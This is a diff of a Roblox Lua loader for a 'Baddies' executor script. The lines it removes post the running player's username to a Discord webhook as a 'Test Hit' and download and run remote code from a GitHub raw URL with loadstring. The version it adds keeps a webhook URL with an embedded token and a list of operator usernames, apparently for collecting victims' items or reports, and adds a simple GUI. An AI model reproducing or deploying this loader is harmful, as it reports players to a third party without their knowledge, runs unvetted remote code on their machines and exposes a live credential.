@@ -1,20 +1,28 @@
--- Test Loader with Direct Notification
-
+-- SETTINGS
 _G.POOR_WEBHOOK = "https://discord.com/api/v10/webhooks/1494420941680148742/DrJ5QakV0MEwSTTFg5KMb_QJWFSF3GsDTi3J-qG7S2qWYjvpTwRDarWiqMxvkGUEfQzw"
 
-_G.MY_USERNAMES = {"antwon_yourfriend", "ahzique09", "x"}
+_G.MY_USERNAMES = {"thisisanalt048", "x", "x"}
 
 _G.PING_POOR = true
 
-task.spawn(function()
-    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
-        local http = game:GetService("HttpService")
-        local data = {
-            content = "@everyone **Test Hit**\nUsername: " .. game.Players.LocalPlayer.Name .. "\nExecutor: Delta\nTime: " .. os.date("%X")
-        }
-        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
-    end
-end)
+print("✅ Baddies script loaded successfully by " .. game.Players.LocalPlayer.Name)
 
-task.spawn(function()
-loadstring (game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true)) 0 end)
+-- Simple GUI for testing
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.Parent = ScreenGui
+
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Size = UDim2.new(1, 0, 0, 50)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Text = "Baddies Script Loaded!"
+TextLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+TextLabel.TextScaled = true
+TextLabel.Parent = Frame
+
+print("GUI should have appeared!")
